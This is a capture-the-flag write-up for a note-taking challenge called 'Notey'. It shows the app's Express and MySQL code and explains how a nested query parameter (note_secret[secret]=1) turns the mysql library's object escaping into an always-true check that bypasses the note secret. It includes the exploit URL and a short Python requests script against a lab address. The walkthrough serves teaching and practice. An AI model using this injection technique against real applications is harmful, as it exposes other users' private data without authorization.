# Notey

For the purpose of simplicity I will list here only important functions and files.

{% code title="Init.db" %}
```sql
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
CREATE TABLE IF NOT EXISTS `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL UNIQUE,
  `password` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=66 ;

CREATE TABLE IF NOT EXISTS `notes` (
  `note_id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `secret` varchar(255) NOT NULL,
  `note` varchar(255) NOT NULL,
  PRIMARY KEY (`note_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=66 ;
```
{% endcode %}

{% code title="index.js" %}
```js
const express = require('express');
const bodyParser = require('body-parser');
const crypto=require('crypto');
var session = require('express-session');
const db = require('./database');
const middleware = require('./middlewares');

const app = express();


app.use(bodyParser.urlencoded({
extended: true
}))

app.use(session({
    secret: crypto.randomBytes(32).toString("hex"),
    resave: true,
    saveUninitialized: true
}));
```
{% endcode %}

View endpoint

{% code title="index.js" %}
```js
app.get('/viewNote', middleware.auth, (req, res) => {
    const { note_id,note_secret } = req.query;

    if (note_id && note_secret){
        db.getNoteById(note_id, note_secret, (err, notes) => {
            if (err) {
            return res.status(500).json({ error: 'Internal Server Error' });
            }
            return res.json(notes);
        });
    }
    else
    {
        return res.status(400).json({"Error":"Missing required data"});
    }
});
```
{% endcode %}

Get note by ID endpoint

{% code title="index.js" %}
```js
function getNoteById(noteId, secret, callback) {
  const query = 'SELECT note_id,username,note FROM notes WHERE note_id = ? and secret = ?';
  console.log(noteId,secret);
  pool.query(query, [noteId,secret], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      callback(err, null);
      return;
    }
    callback(null, results);
  });
}
```
{% endcode %}

Insert flag as note in the admin account

{% code title="index.js" %}
```js
function insertAdminNoteOnce(callback) {
  const checkNoteQuery = 'SELECT COUNT(*) AS count FROM notes WHERE username = "admin"';
  const insertNoteQuery = 'INSERT INTO notes(username,note,secret)values(?,?,?)';
  const flag = process.env.DYN_FLAG || "placeholder";
  const secret = crypto.randomBytes(32).toString("hex");

  pool.query(checkNoteQuery, [], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      callback(err, null);
      return;
    }

    const NoteCount = results[0].count;

    if (NoteCount === 0) {
      pool.query(insertNoteQuery, ["admin", flag, secret], (err, results) => {
        if (err) {
          console.error('Error executing query:', err);
          callback(err, null);
          return;
        }
        console.log(`Admin Note inserted successfully with this secret ${secret}`);
        callback(null, results);
      });
    } else {
      console.log('Admin Note already exists. No insertion needed.');
      callback(null, null);
    }
  });
}
```
{% endcode %}

So this application basically has these functionalities:

* Register an account
* Login to account
* Profile view
* Add note
* View note

Also, when starting the program it automatically calls insertAdminNoteOnce, which will insert the flag as a note with a random 32 hex secret in the admin account.

To view a note you need to provide 2 GET parameters: note\_id & note\_secret.

So how can we view the flag? Clearly, we can't bruteforce a 32 random bytes secret.

### Analyzing

We can easily get the note id, by looking at the table creation: AUTO\_INCREMENT=66 which means that the ID starts from 66.

For the note secret, looking at the first few lines of index.js we can see an interesting line:

{% code title="index.js" %}
```js
app.use(bodyParser.urlencoded({
extended: true
}))
```
{% endcode %}

What does extended mean? From [expressjs docs](https://expressjs.com/en/resources/middleware/body-parser.html):

> The “extended” syntax allows for rich objects and arrays to be encoded into the URL-encoded format, allowing for a JSON-like experience with URL-encoded.

This allows nested query parameters. For example, if we pass our GET query like:

```
/viewNote?note_id=66&note_secret[c]=d
```

It would be interpreted as:

```js
note_id = 66
note_secret = { 'c': 'd' }
```

The viewNote route will then call the getNoteById function, which constructs a SELECT query with our inputs:

{% code title="" %}
```js
function getNoteById(noteId, secret, callback) {
  const query = 'SELECT note_id,username,note FROM notes WHERE note_id = ? and secret = ?';
  console.log(noteId,secret);
  pool.query(query, [noteId,secret],
```
{% endcode %}

When you pass a JavaScript object to SQL (the mysql library), it treats the key as a column and the value as the value of that column. In simpler terms our query is going to be like this:

```sql
SELECT note_id,username,note FROM notes WHERE note_id = 66 and secret = `c` = 'd'
```

Backticks (\`) in MySQL encapsulate identifiers like table and column names. So if c was an existing column, it will compare all the values in it with the secret column which would result in `true` if at least one value appeared in both columns (c and secret) and then it will compare it with the value 'd'.

So if we passed this GET query:

```
/viewNote?note_id=66&note_secret[secret]=1
```

It would be interpreted in SQL as:

```sql
SELECT note_id,username,note FROM notes WHERE note_id = 66 and secret = `secret` = '1'
```

so `secret` = `secret` = 1 will evaluate to true = 1; which is always true in MySQL.

### Exploiting

Because of jailing we need to write a simple and fast script using a requests session:

```py
import requests


sess = requests.Session()


url = "http://169.254.55.45:5000/"


data = {"username":"any","password":"any"}

print(sess.post(url+"register", data=data).text)

print(sess.post(url+"login", data=data).text)

print(sess.get(url+"viewNote?note_id=66&note_secret[secret]=1").text)
```

And we get the flag:

![](<../../.gitbook/assets/a9bf7ae8 4e41 422c 9d30 28b6395a4052>)
